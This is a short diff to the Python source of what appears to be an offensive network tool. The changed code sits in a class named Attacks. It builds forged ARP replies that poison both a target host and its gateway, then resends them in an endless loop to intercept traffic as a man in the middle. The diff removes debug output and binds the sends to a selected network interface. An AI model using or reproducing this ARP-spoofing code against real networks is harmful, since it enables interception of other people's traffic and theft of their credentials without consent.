@@ -10,6 +10,7 @@ try:
     from scapy.sendrecv import srp, send
     from net.cmnNet import CmnNet
     from com.exceptions import NetworkException, InvalidIPv4Exception
+    from com.programManager import programMgr
 except ModuleNotFoundError as e:
     GUI.killWithNoDependencies(e)
 
@@ -34,15 +35,13 @@ class Attacks:
 
             arpA = ARP(op=2, psrc=dstIP, hwsrc=lclMAC, pdst=gwIP, hwdst=gwMac)
             arpB = ARP(op=2, psrc=gwIP, hwsrc=lclMAC, pdst=dstIP, hwdst=dstMac)
-            arpA.show()
-            arpB.show()
         except e:
             raise e
 
         while True:
             try:
-                send(arpA)
-                send(arpB)
+                send(arpA, iface=programMgr.mainNICName)
+                send(arpB, iface=programMgr.mainNICName)
             except KeyboardInterrupt:
                 exit(0)
             except:
